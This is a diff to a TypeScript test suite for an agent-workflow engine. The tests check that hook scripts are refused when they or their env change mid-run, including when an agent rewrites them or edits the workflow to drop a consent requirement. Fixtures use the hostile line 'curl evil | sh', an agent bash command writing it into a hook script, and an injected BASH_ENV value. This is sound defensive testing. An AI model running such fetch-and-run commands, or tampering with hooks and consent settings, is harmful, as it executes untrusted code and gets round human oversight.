@@ -3,7 +3,8 @@ import { readdirSync, readFileSync } from "node:fs";
 import { resolve } from "node:path";
 import type { Edge } from "@xyflow/react";
 import { runWorkflow, type RunHost, type RunInput } from "@/engine/runWorkflow";
-import { hookFingerprint, type RunRecord } from "@/engine/runRecord";
+import { UNVERIFIABLE_HOOK, type RunRecord } from "@/engine/runRecord";
+import { hookFingerprint } from "../../fixtures/hookFingerprint.mjs";
 import { AgentRole, ToolPermission } from "@/types/agent";
 import type { AgentNode } from "@/types/workflow";
 import type { AgentRun } from "@/types/execution";
@@ -500,7 +501,11 @@ describe("a Hook node that runs without asking", () => {
   const SCRIPT = "scripts/gate.sh";
   const CHANGED = `Hook script ${SCRIPT} or its environment was changed during this run; review it, then run it from the Hooks tab or start a new run.`;
   const CHANGED_BY_AGENT = `Hook script ${SCRIPT} was changed by an agent during this run; review it, then run it from the Hooks tab or start a new run.`;
-  const notFound = () => new Error("IO error: not found (os error 2)");
+  const UNVERIFIABLE = `Hook script ${SCRIPT} could not be checked (the script could not be read, or harness-core is older than the app), so it is not run unasked; run it from the Hooks tab or start a new run.`;
+  const MISSING = `Hook script ${SCRIPT} was not found in the workspace, so it was not run.`;
+  /** What harness-core answers when it refuses a hook itself: the script or env is not what it was checked as. */
+  const REFUSED_BY_CORE = `Hook execution error: Hook script ${SCRIPT} or its environment changed after it was checked; it was not run.`;
+  const envOf = (args: Record<string, unknown>) => args.env as Record<string, string> | undefined;
 
   function hookNode(overrides: { id?: string; path?: string; requireConsent?: boolean; env?: Record<string, string> } = {}): AgentNode {
     const gate = makeNode(overrides.id ?? "Gate");
@@ -511,14 +516,16 @@ describe("a Hook node that runs without asking", () => {
     return gate;
   }
 
-  /** The script's text at each read in turn (the last one goes on repeating); null is a read that fails. Every other file is missing. */
-  function script(...reads: Array<string | null>): Handler {
+  /** harness-core's hook_fingerprint for SCRIPT: the fingerprint of what the script holds at each call in turn
+   *  (the last one goes on repeating), as text or as bytes, with the env it is asked for; null is no such script,
+   *  and an Error a call that fails. Every other path has no script. */
+  function script(...reads: Array<string | Uint8Array | null | Error>): Handler {
     let next = 0;
     return (args) => {
-      if (args.relativePath !== SCRIPT) throw notFound();
-      const text = reads[Math.min(next++, reads.length - 1)];
-      if (text === null) throw notFound();
-      return text;
+      if (args.hookPath !== SCRIPT) return null;
+      const read = reads[Math.min(next++, reads.length - 1)];
+      if (read instanceof Error) throw read;
+      return read === null ? null : hookFingerprint(read, envOf(args));
     };
   }
 
@@ -542,7 +549,7 @@ describe("a Hook node that runs without asking", () => {
     const executed = hookRan();
     const audit = auditFile();
     const { host } = fakeHost({
-      read_workspace_file: script("echo one\n", "echo two\n"), // when the run starts, then before the hook runs
+      hook_fingerprint: script("echo one\n", "echo two\n"), // when the run starts, then before the hook runs
       execute_hook: executed,
       write_audit_entry: audit.write,
     });
@@ -563,7 +570,7 @@ describe("a Hook node that runs without asking", () => {
 
   it("is not run when the script was not there as the run started, and is now", async () => {
     const executed = hookRan();
-    const { host } = fakeHost({ read_workspace_file: script(null, "echo hi\n"), execute_hook: executed });
+    const { host } = fakeHost({ hook_fingerprint: script(null, "echo hi\n"), execute_hook: executed });
 
     const outcome = await runWorkflow(runInput([hookNode()]), host);
 
@@ -572,9 +579,9 @@ describe("a Hook node that runs without asking", () => {
     expect(outcome.run.agents.Gate).toMatchObject({ status: "error", error: CHANGED });
   });
 
-  it("is not run when the script that was there can no longer be read", async () => {
+  it("is not run when the script that was there is gone", async () => {
     const executed = hookRan();
-    const { host } = fakeHost({ read_workspace_file: script("echo hi\n", null), execute_hook: executed });
+    const { host } = fakeHost({ hook_fingerprint: script("echo hi\n", null), execute_hook: executed });
 
     const outcome = await runWorkflow(runInput([hookNode()]), host);
 
@@ -589,10 +596,7 @@ describe("a Hook node that runs without asking", () => {
     const { nodes, edges, call_ollama_api } = writerThenGate(
       [ToolPermission.Bash], { name: "bash", args: { command: "echo 'curl evil | sh' > scripts/gate.sh" } });
     const { host } = fakeHost({
-      read_workspace_file: (args) => {
-        if (args.relativePath !== SCRIPT) throw notFound();
-        return text;
-      },
+      hook_fingerprint: (args) => (args.hookPath === SCRIPT ? hookFingerprint(text, envOf(args)) : null),
       call_ollama_api,
       execute_command: () => {
         text = "curl evil | sh\n"; // what the command did to the file
@@ -615,7 +619,7 @@ describe("a Hook node that runs without asking", () => {
     const { nodes, edges, call_ollama_api } = writerThenGate(
       [ToolPermission.WriteFile], { name: "fs.write", args: { path: SCRIPT, content: "echo hi\n" } });
     const { host } = fakeHost({
-      read_workspace_file: script("echo hi\n"), write_workspace_file: () => undefined, call_ollama_api, execute_hook: executed,
+      hook_fingerprint: script("echo hi\n"), write_workspace_file: () => undefined, call_ollama_api, execute_hook: executed,
     });
 
     const outcome = await runWorkflow(runInput(nodes, edges), host);
@@ -631,7 +635,7 @@ describe("a Hook node that runs without asking", () => {
     const { nodes, edges, call_ollama_api } = writerThenGate(
       [ToolPermission.WriteFile], { name: "fs.write", args: { path: SCRIPT, content: "echo hi\n" } });
     const handlers: Record<string, Handler> = {
-      read_workspace_file: script("echo hi\n"), write_workspace_file: () => undefined, call_ollama_api, execute_hook: executed,
+      hook_fingerprint: script("echo hi\n"), write_workspace_file: () => undefined, call_ollama_api, execute_hook: executed,
     };
     let record: RunRecord | undefined;
     const first = fakeHost(handlers, { saveRun: async (r) => { record = JSON.parse(JSON.stringify(r)); } });
@@ -649,7 +653,7 @@ describe("a Hook node that runs without asking", () => {
 
   it("runs when the script is the same as when the run started", async () => {
     const executed = hookRan();
-    const { host } = fakeHost({ read_workspace_file: script("echo hi\n"), execute_hook: executed });
+    const { host } = fakeHost({ hook_fingerprint: script("echo hi\n"), execute_hook: executed });
 
     const outcome = await runWorkflow(runInput([hookNode()]), host);
 
@@ -665,7 +669,7 @@ describe("a Hook node that runs without asking", () => {
     const { nodes, edges, call_ollama_api } = writerThenGate(
       [ToolPermission.WriteFile], { name: "fs.write", args: { path: "notes/plan.md", content: "# Plan\n" } });
     const { host } = fakeHost({
-      read_workspace_file: script("echo hi\n"), write_workspace_file: () => undefined, call_ollama_api, execute_hook: executed,
+      hook_fingerprint: script("echo hi\n"), write_workspace_file: () => undefined, call_ollama_api, execute_hook: executed,
     });
 
     const outcome = await runWorkflow(runInput(nodes, edges), host);
@@ -676,36 +680,159 @@ describe("a Hook node that runs without asking", () => {
     expect(outcome.run.status).toBe("done");
   });
 
-  it("is run when its script is missing before and after, and then fails as it does without this check", async () => {
+  it("fails as a missing script, without execute_hook being called, when it was missing as the run started and still is", async () => {
+    const executed = hookRan();
+    const audit = auditFile();
+    const { host } = fakeHost({ hook_fingerprint: script(null), execute_hook: executed, write_audit_entry: audit.write });
+
+    const outcome = await runWorkflow(runInput([hookNode()]), host);
+
+    if (!outcome.started) throw new Error(outcome.error);
+    expect(executed).not.toHaveBeenCalled();
+    expect(outcome.run.agents.Gate).toMatchObject({ status: "error", error: MISSING });
+    expect(outcome.run.status).toBe("error");
+    expect(audit.writes).toEqual([{
+      workspacePath: "/ws",
+      entry: expect.objectContaining({ action: "hook_executed", agentId: "Gate", success: false, details: MISSING }),
+    }]);
+  });
+
+  it("is not run when a script that is not UTF-8 was rewritten during the run: the fingerprint is of its bytes", async () => {
+    // Read as text, both are the same (an invalid byte becomes U+FFFD), so a check made on the text cannot tell them apart.
+    const shebang = [...new TextEncoder().encode("#!/bin/sh\n# ")];
+    const before = Uint8Array.from([...shebang, 0xff, 0x0a]);
+    const after = Uint8Array.from([...shebang, 0xfe, 0x0a]);
+    const unchanged = hookRan();
+    const rewritten = hookRan();
+
+    const same = await runWorkflow(runInput([hookNode()]), fakeHost({ hook_fingerprint: script(before, before), execute_hook: unchanged }).host);
+    const changed = await runWorkflow(runInput([hookNode()]), fakeHost({ hook_fingerprint: script(before, after), execute_hook: rewritten }).host);
+
+    if (!same.started || !changed.started) throw new Error("a run did not start");
+    expect(unchanged).toHaveBeenCalledTimes(1); // the same script runs, though it is not text
+    expect(same.run.agents.Gate.status).toBe("done");
+    expect(rewritten).not.toHaveBeenCalled();
+    expect(changed.run.agents.Gate).toMatchObject({ status: "error", error: CHANGED });
+  });
+
+  it("is not run when harness-core could not fingerprint its script as the run started, and that does not fail the run", async () => {
+    const executed = hookRan();
+    const audit = auditFile();
+    const records: RunRecord[] = [];
+    let asked = 0;
     const { host } = fakeHost({
-      read_workspace_file: script(null),
-      execute_hook: () => { throw new Error("Path not found: scripts/gate.sh"); },
+      hook_fingerprint: () => { asked++; throw new Error("IO error: Permission denied (os error 13)"); },
+      execute_hook: executed,
+      write_audit_entry: audit.write,
+    }, { saveRun: async (r) => { records.push(JSON.parse(JSON.stringify(r))); } });
+
+    const outcome = await runWorkflow(runInput([hookNode()]), host);
+
+    if (!outcome.started) throw new Error(outcome.error); // the run did start: only the hook is refused
+    expect(executed).not.toHaveBeenCalled();
+    expect(asked).toBe(1); // as the run started; what could not be fingerprinted then is not tried again
+    expect(outcome.run.agents.Gate).toMatchObject({ status: "error", error: UNVERIFIABLE });
+    expect(records[0].hookScripts).toEqual({ "agent-0": UNVERIFIABLE_HOOK });
+    expect(audit.writes).toEqual([{
+      workspacePath: "/ws",
+      entry: expect.objectContaining({ action: "hook_executed", agentId: "Gate", success: false, details: UNVERIFIABLE }),
+    }]);
+  });
+
+  it("is not run when harness-core is older than the app and has no hook_fingerprint, and the refusal names that", async () => {
+    const executed = hookRan();
+    const { host } = fakeHost({
+      hook_fingerprint: () => { throw new Error("Unknown command: hook_fingerprint"); }, // as harness-core answers
+      execute_hook: executed,
     });
 
     const outcome = await runWorkflow(runInput([hookNode()]), host);
 
     if (!outcome.started) throw new Error(outcome.error);
-    expect(outcome.run.agents.Gate.status).toBe("error");
-    expect(outcome.run.agents.Gate.error).toContain("Path not found");
-    expect(outcome.run.agents.Gate.error).not.toContain("was changed");
+    expect(executed).not.toHaveBeenCalled();
+    expect(outcome.run.agents.Gate).toMatchObject({ status: "error", error: UNVERIFIABLE });
+    expect(outcome.run.agents.Gate.error).toContain("harness-core is older than the app");
+  });
+
+  it.each([
+    ["nothing", undefined],
+    ["an empty string", ""],
+    ["a number", 7],
+    ["an object", { fingerprint: "abc" }],
+  ])("is not run when harness-core answers hook_fingerprint with %s: only a fingerprint or null is an answer", async (_what, answer) => {
+    const executed = hookRan();
+    const { host } = fakeHost({ hook_fingerprint: () => answer, execute_hook: executed });
+
+    const outcome = await runWorkflow(runInput([hookNode()]), host);
+
+    if (!outcome.started) throw new Error(outcome.error);
+    expect(executed).not.toHaveBeenCalled();
+    expect(outcome.run.agents.Gate).toMatchObject({ status: "error", error: UNVERIFIABLE });
+  });
+
+  it("is not run when its fingerprint cannot be taken just before it runs, though it could be as the run started", async () => {
+    const executed = hookRan();
+    const { host } = fakeHost({
+      hook_fingerprint: script("echo hi\n", new Error("IO error: not a regular file")), execute_hook: executed,
+    });
+
+    const outcome = await runWorkflow(runInput([hookNode()]), host);
+
+    if (!outcome.started) throw new Error(outcome.error);
+    expect(executed).not.toHaveBeenCalled();
+    expect(outcome.run.agents.Gate).toMatchObject({ status: "error", error: UNVERIFIABLE });
+  });
+
+  it("gives execute_hook the fingerprint the run took as it started, for harness-core to verify right before the script starts", async () => {
+    const executed = hookRan();
+    const records: RunRecord[] = [];
+    const { host } = fakeHost({ hook_fingerprint: script("echo hi\n"), execute_hook: executed },
+      { saveRun: async (r) => { records.push(JSON.parse(JSON.stringify(r))); } });
+
+    const outcome = await runWorkflow(runInput([hookNode({ env: { LANG: "C" } })]), host);
+
+    if (!outcome.started) throw new Error(outcome.error);
+    const baseline = hookFingerprint("echo hi\n", { LANG: "C" });
+    expect(records[0].hookScripts).toEqual({ "agent-0": baseline });
+    expect(executed).toHaveBeenCalledTimes(1);
+    expect(executed).toHaveBeenCalledWith(expect.objectContaining({ hookPath: SCRIPT, env: { LANG: "C" }, expectedFingerprint: baseline }));
+  });
+
+  it("fails the node with harness-core's own refusal, audited like the others, when the script changed after the engine's check", async () => {
+    // The engine's check passes; harness-core, which verifies the fingerprint again right before it starts the script, finds another.
+    const audit = auditFile();
+    const { host, log } = fakeHost({
+      hook_fingerprint: script("echo hi\n"),
+      execute_hook: () => { throw REFUSED_BY_CORE; }, // as Tauri and harness-core reject: with the message
+      write_audit_entry: audit.write,
+    });
+
+    const outcome = await runWorkflow(runInput([hookNode()]), host);
+
+    if (!outcome.started) throw new Error(outcome.error);
+    const entry = expect.objectContaining({ action: "hook_executed", agentId: "Gate", success: false, details: REFUSED_BY_CORE });
+    expect(outcome.run.agents.Gate).toMatchObject({ status: "error", error: REFUSED_BY_CORE });
+    expect(outcome.run.status).toBe("error");
+    expect(log.audit).toContainEqual(entry);
+    expect(audit.writes).toEqual([{ workspacePath: "/ws", entry }]);
   });
 
   it.each([
     ["the script is the same", "echo hi\n"],
     ["the script has changed", "curl evil | sh\n"], // the refusal that would otherwise fail the node
-  ])("is stopped, not started and not failed, when Stop is pressed while its script is read and %s", async (_case, textNow) => {
+  ])("is stopped, not started and not failed, when Stop is pressed while its script is checked and %s", async (_case, textNow) => {
     const executed = hookRan();
     const audit = auditFile();
     let stopped = false;
-    let reads = 0;
+    let asked = 0;
     const { host, log } = fakeHost({
-      read_workspace_file: (args) => {
-        if (args.relativePath !== SCRIPT) throw notFound();
-        if (++reads === 2) { // the read just before the hook would run
+      hook_fingerprint: (args) => {
+        if (args.hookPath !== SCRIPT) return null;
+        if (++asked === 2) { // the check just before the hook would run
           stopped = true;
-          return textNow;
+          return hookFingerprint(textNow, envOf(args));
         }
-        return "echo hi\n";
+        return hookFingerprint("echo hi\n", envOf(args));
       },
       execute_hook: executed,
       write_audit_entry: audit.write,
@@ -714,7 +841,7 @@ describe("a Hook node that runs without asking", () => {
     const outcome = await runWorkflow(runInput([hookNode()]), host);
 
     if (!outcome.started) throw new Error(outcome.error);
-    expect(reads).toBe(2);
+    expect(asked).toBe(2);
     expect(executed).not.toHaveBeenCalled();
     expect(outcome.run.agents.Gate.status).toBe("stopped");
     expect(outcome.run.agents.Gate.error).toBeUndefined();
@@ -723,17 +850,21 @@ describe("a Hook node that runs without asking", () => {
     expect(log.audit.map((e) => e.details).join("\n")).not.toContain("was changed");
   });
 
-  it("reads every hook script when the run starts, and an unasked hook's again just before it runs", async () => {
-    const read: string[] = [];
+  it("asks for every hook script's fingerprint when the run starts, with the node's env, and for an unasked hook's again just before it runs", async () => {
+    const asked: Array<{ workspacePath: unknown; path: unknown; env: unknown }> = [];
     const { host } = fakeHost({
-      read_workspace_file: (args) => { read.push(String(args.relativePath)); throw notFound(); },
+      hook_fingerprint: (args) => {
+        asked.push({ workspacePath: args.workspacePath, path: args.hookPath, env: args.env });
+        return hookFingerprint("echo hi\n", envOf(args));
+      },
       execute_hook: hookRan(),
     });
 
-    await runWorkflow(runInput([hookNode(), hookNode({ id: "Ask", path: "scripts/ask.sh", requireConsent: true })]), host);
+    await runWorkflow(runInput([hookNode({ env: { LANG: "C" } }), hookNode({ id: "Ask", path: "scripts/ask.sh", requireConsent: true })]), host);
 
-    expect(read.filter((path) => path === SCRIPT)).toHaveLength(2); // the baseline, and the check before it runs
-    expect(read.filter((path) => path === "scripts/ask.sh")).toHaveLength(1); // the baseline only: it does not run
+    const gate = { workspacePath: "/ws", path: SCRIPT, env: { LANG: "C" } };
+    expect(asked.filter((a) => a.path === SCRIPT)).toEqual([gate, gate]); // the baseline, and the check before it runs
+    expect(asked.filter((a) => a.path === "scripts/ask.sh")).toEqual([{ workspacePath: "/ws", path: "scripts/ask.sh", env: undefined }]); // the baseline only: it does not run
   });
 
   it("has a refusal for missing consent written to the workspace's audit log too", async () => {
@@ -763,17 +894,17 @@ describe("a Hook node that runs without asking", () => {
     expect(executed).not.toHaveBeenCalled();
     expect(commands).not.toContain("write_audit_entry");
     expect(commands).not.toContain("read_workspace_file");
+    expect(commands).not.toContain("hook_fingerprint");
     expect(log.audit.map((e) => e.details)).toContain("Open a workspace to run hooks.");
   });
 
-  it("saves a SHA-256 of every hook script and its env, a consent-required one's too, and never the text", async () => {
+  it("saves a fingerprint of every hook script and its env, a consent-required one's too, and never the text", async () => {
     const records: RunRecord[] = [];
     const files: Record<string, string> = { [SCRIPT]: "echo ok\n", "scripts/ask.sh": "echo ask\n" };
     const { host } = fakeHost({
-      read_workspace_file: (args) => {
-        const text = files[String(args.relativePath)];
-        if (text === undefined) throw notFound();
-        return text;
+      hook_fingerprint: (args) => {
+        const text = files[String(args.hookPath)];
+        return text === undefined ? null : hookFingerprint(text, envOf(args));
       },
       execute_hook: hookRan(),
     }, { saveRun: async (r) => { records.push(JSON.parse(JSON.stringify(r))); } });
@@ -786,8 +917,8 @@ describe("a Hook node that runs without asking", () => {
     await runWorkflow(runInput(nodes), host);
 
     const expected = {
-      "agent-0": await hookFingerprint("echo ok\n", { ALPHA: "1", ZED: "s3cr3t-value" }), "agent-1": null,
-      "agent-2": await hookFingerprint("echo ask\n", undefined),
+      "agent-0": hookFingerprint("echo ok\n", { ALPHA: "1", ZED: "s3cr3t-value" }), "agent-1": null,
+      "agent-2": hookFingerprint("echo ask\n", undefined),
     };
     expect(expected["agent-0"]).toMatch(/^[0-9a-f]{64}$/);
     expect(records[0].hookScripts).toEqual(expected); // from the very first save
@@ -807,27 +938,17 @@ describe("a Hook node that runs without asking", () => {
     expect(record?.hookScripts).toEqual({});
   });
 
-  it("does not start where Web Crypto is missing and a hook would run without asking: the check is not weakened", async () => {
+  it("needs no Web Crypto: the fingerprints are harness-core's, and a hook that runs without asking starts and runs where it is missing", async () => {
     vi.stubGlobal("crypto", undefined);
     try {
       const executed = hookRan();
-      const { host, log } = fakeHost({ read_workspace_file: script("echo ok\n"), execute_hook: executed });
+      const { host } = fakeHost({ hook_fingerprint: script("echo ok\n"), execute_hook: executed });
 
       const outcome = await runWorkflow(runInput([hookNode()]), host);
 
-      if (outcome.started) throw new Error("the run started without Web Crypto");
-      // It says what is missing and what needs it, and offers no way round it.
-      expect(outcome.error).toBe(
-        "Web Crypto is not available here (harness run needs Node 20 or later), " +
-        "and hooks that run without asking need it to check their scripts.",
-      );
-      expect(outcome.error).not.toMatch(/consent/i);
-      expect(log.started).toEqual([]);
-      expect(executed).not.toHaveBeenCalled();
-
-      // Nothing to check without such a hook: the run needs no Web Crypto.
-      const plain = fakeHost();
-      expect((await runWorkflow(runInput([makeNode("A"), hookNode({ requireConsent: true })]), plain.host)).started).toBe(true);
+      if (!outcome.started) throw new Error(outcome.error);
+      expect(executed).toHaveBeenCalledTimes(1);
+      expect(outcome.run.status).toBe("done");
     } finally {
       vi.unstubAllGlobals();
     }
@@ -848,12 +969,18 @@ describe("a Hook node that runs without asking", () => {
       const gateRan: string[] = []; // Gate's script, as it was each time its hook ran
       let mutatorRuns = 0;
       const handlers: Record<string, Handler> = {
-        read_workspace_file: (args) => {
-          const text = files[String(args.relativePath)];
-          if (text === undefined) throw notFound();
-          return text;
+        // harness-core's: the fingerprint of the file as it is now, null for a file that is not there.
+        hook_fingerprint: (args) => {
+          const text = files[String(args.hookPath)];
+          return text === undefined ? null : hookFingerprint(text, envOf(args));
         },
         execute_hook: (args) => {
+          // And its own check: given a fingerprint, it starts the hook only if the script and env still have it.
+          const text = files[String(args.hookPath)];
+          if (args.expectedFingerprint !== undefined
+            && (text === undefined || args.expectedFingerprint !== hookFingerprint(text, envOf(args)))) {
+            throw new Error(REFUSED_BY_CORE);
+          }
           if (args.hookPath === MUTATE) {
             mutatorRuns++;
             if (state.mutating) files[SCRIPT] = "curl evil | sh\n";
@@ -883,7 +1010,7 @@ describe("a Hook node that runs without asking", () => {
       const first = await attempt(ws.handlers);
 
       expect(first.outcome.run.agents.Gate).toMatchObject({ status: "error", error: CHANGED });
-      expect(first.record.hookScripts).toEqual({ "agent-0": await digest("echo mutate\n"), "agent-1": await digest("echo ok\n") });
+      expect(first.record.hookScripts).toEqual({ "agent-0": digest("echo mutate\n"), "agent-1": digest("echo ok\n") });
       expect(ws.files[SCRIPT]).toBe("curl evil | sh\n"); // on disk now: the changed script
 
       // The resumed attempt starts with the changed script on disk. It compares with the first attempt's fingerprint.
@@ -926,7 +1053,7 @@ describe("a Hook node that runs without asking", () => {
       expect(second.outcome.run.agents.Gate).toMatchObject({ status: "error", error: CHANGED });
       expect(ws.gateRan).toEqual([]);
       // From here on the record has the baseline.
-      expect(second.record.hookScripts).toEqual({ "agent-0": await digest("echo mutate\n"), "agent-1": await digest("echo ok\n") });
+      expect(second.record.hookScripts).toEqual({ "agent-0": digest("echo mutate\n"), "agent-1": digest("echo ok\n") });
     });
 
     it("runs a hook from a record saved before hookScripts existed when its script is unchanged", async () => {
@@ -1005,7 +1132,7 @@ describe("a Hook node that runs without asking", () => {
       // Attempt 1: Gate needs consent, so it does not run, and Mutator changes its script meanwhile.
       const first = await attempt(ws.handlers, undefined, consentGate());
       expect(first.outcome.run.agents.Gate).toMatchObject({ status: "error", error: expect.stringContaining("manual consent") });
-      expect(first.record.hookScripts).toEqual({ "agent-0": await digest("echo mutate\n"), "agent-1": await digest("echo ok\n") }); // Gate's too
+      expect(first.record.hookScripts).toEqual({ "agent-0": digest("echo mutate\n"), "agent-1": digest("echo ok\n") }); // Gate's too
       expect(ws.files[SCRIPT]).toBe("curl evil | sh\n");
 
       // The workflow file is then edited (an agent can write it) to drop the requirement. The script on disk is no longer
@@ -1022,7 +1149,7 @@ describe("a Hook node that runs without asking", () => {
       // Attempt 1: Gate needs consent, so it does not run.
       const first = await attempt(ws.handlers, undefined, [hookNode({ id: "Mutator", path: MUTATE }), hookNode({ requireConsent: true, env: { LANG: "C" } })]);
       expect(first.outcome.run.agents.Gate).toMatchObject({ status: "error", error: expect.stringContaining("manual consent") });
-      expect(first.record.hookScripts?.["agent-1"]).toBe(await digest("echo ok\n", { LANG: "C" }));
+      expect(first.record.hookScripts?.["agent-1"]).toBe(digest("echo ok\n", { LANG: "C" }));
 
       // The workflow file drops the requirement and adds a variable: the same script, another env.
       const refused = await attempt(ws.handlers, first.record, mutatorThenGate(SCRIPT, { LANG: "C", BASH_ENV: "/tmp/evil.sh" }));
@@ -1040,7 +1167,7 @@ describe("a Hook node that runs without asking", () => {
       ws.state.mutating = false;
       ws.state.gateExit = 1; // attempt 1: Gate runs unasked, and its hook fails for its own reasons
       const first = await attempt(ws.handlers);
-      expect(first.record.hookScripts?.["agent-1"]).toBe(await digest("echo ok\n"));
+      expect(first.record.hookScripts?.["agent-1"]).toBe(digest("echo ok\n"));
 
       // Attempt 2: Gate needs consent, and its script is changed meanwhile.
       ws.files[SCRIPT] = "curl evil | sh\n";
@@ -1060,7 +1187,7 @@ describe("a Hook node that runs without asking", () => {
       ws.state.mutating = false;
       // Attempt 1 has only Mutator.
       const first = await attempt(ws.handlers, undefined, [hookNode({ id: "Mutator", path: MUTATE })], []);
-      expect(first.record.hookScripts).toEqual({ "agent-0": await digest("echo mutate\n") });
+      expect(first.record.hookScripts).toEqual({ "agent-0": digest("echo mutate\n") });
 
       // The workflow file gains a Gate hook that runs unasked.
       const second = await attempt(ws.handlers, first.record);
@@ -1103,7 +1230,7 @@ describe("a Hook node that runs without asking", () => {
       const first = await attempt(ws.handlers);
       ws.state.gateExit = 0;
       // A record that was edited by hand: the field is not an object, or its entries are not fingerprints.
-      for (const broken of [null, "abc", [await digest("echo ok\n")], { "agent-1": 7 }]) {
+      for (const broken of [null, "abc", [digest("echo ok\n")], { "agent-1": 7 }]) {
         const record = { ...first.record, hookScripts: broken } as unknown as RunRecord;
 
         const resumed = await attempt(ws.handlers, record);
@@ -1111,6 +1238,59 @@ describe("a Hook node that runs without asking", () => {
         expect(resumed.outcome.run.agents.Gate.error, JSON.stringify(broken)).toContain("has no baseline from this run's first attempt");
       }
       expect(ws.gateRan).toEqual(["echo ok\n"]); // only the first attempt's
+    });
+
+    it("carries an unverifiable baseline on: the hook is refused on resume too, though harness-core can fingerprint it now", async () => {
+      const ws = workspace();
+      const oldCore: Record<string, Handler> = {
+        ...ws.handlers, hook_fingerprint: () => { throw new Error("Unknown command: hook_fingerprint"); },
+      };
+      const first = await attempt(oldCore, undefined, [hookNode()], []);
+      expect(first.outcome.run.agents.Gate).toMatchObject({ status: "error", error: UNVERIFIABLE });
+      expect(first.record.hookScripts).toEqual({ "agent-0": UNVERIFIABLE_HOOK });
+
+      // harness-core is updated. A resume takes no baselines, so the hook is still not run.
+      const second = await attempt(ws.handlers, first.record, [hookNode()], []);
+
+      expect(second.outcome.run.agents.Gate).toMatchObject({ status: "error", error: UNVERIFIABLE });
+      expect(second.record.hookScripts).toEqual(first.record.hookScripts);
+      expect(ws.gateRan).toEqual([]);
+      // A new run takes its own baseline, and runs it.
+      const fresh = await attempt(ws.handlers, undefined, [hookNode()], []);
+      expect(fresh.outcome.run.agents.Gate.status).toBe("done");
+      expect(ws.gateRan).toEqual(["echo ok\n"]);
+    });
+
+    it("refuses on resume a hook whose baseline an earlier version saved, as the SHA-256 of the script's text: it never matches, and nothing migrates it", async () => {
+      const ws = workspace();
+      ws.state.gateExit = 1; // the first attempt fails at Gate for its own reasons, so a resume runs it again
+      // What the text-based fingerprint of that version was for `echo ok`: JSON.stringify(["echo ok\n", []]), hashed.
+      const earlier = "131b0aa3a8ff603a372cc9d8aca1acfe6668aba4922449f297eef8fcf9b653c5";
+      const first = await attempt(ws.handlers, undefined, [hookNode()], []);
+      const record = { ...first.record, hookScripts: { "agent-0": earlier } };
+      ws.state.gateExit = 0;
+      ws.gateRan.length = 0;
+
+      const resumed = await attempt(ws.handlers, record, [hookNode()], []);
+
+      expect(resumed.outcome.run.agents.Gate).toMatchObject({ status: "error", error: CHANGED });
+      expect(resumed.record.hookScripts).toEqual({ "agent-0": earlier }); // carried on as it is
+      expect(ws.gateRan).toEqual([]);
+    });
+
+    it("keeps a missing script's baseline: one that appears after the first attempt is refused on resume, not taken as the baseline", async () => {
+      const ws = workspace();
+      delete ws.files[SCRIPT];
+      const first = await attempt(ws.handlers, undefined, [hookNode()], []);
+      expect(first.outcome.run.agents.Gate).toMatchObject({ status: "error", error: MISSING });
+      expect(first.record.hookScripts).toEqual({ "agent-0": null });
+
+      ws.files[SCRIPT] = "echo ok\n"; // the script appears
+      const second = await attempt(ws.handlers, first.record, [hookNode()], []);
+
+      expect(second.outcome.run.agents.Gate).toMatchObject({ status: "error", error: CHANGED });
+      expect(second.record.hookScripts).toEqual({ "agent-0": null });
+      expect(ws.gateRan).toEqual([]);
     });
   });
 });
@@ -1578,6 +1758,7 @@ describe("a gateway that routes differently when a revision re-runs it", () => {
     let exitHook: (exitCode: number) => void = () => {};
     const calls: Record<string, number> = {};
     const { host, log } = fakeHost({
+      hook_fingerprint: () => hookFingerprint("exit 1\n", undefined), // the script is there, and does not change
       execute_hook: () => new Promise((resolve) => {
         exitHook = (exitCode) => resolve({ exitCode, stdout: "", stderr: "boom", durationMs: 1 });
         hookStarted();
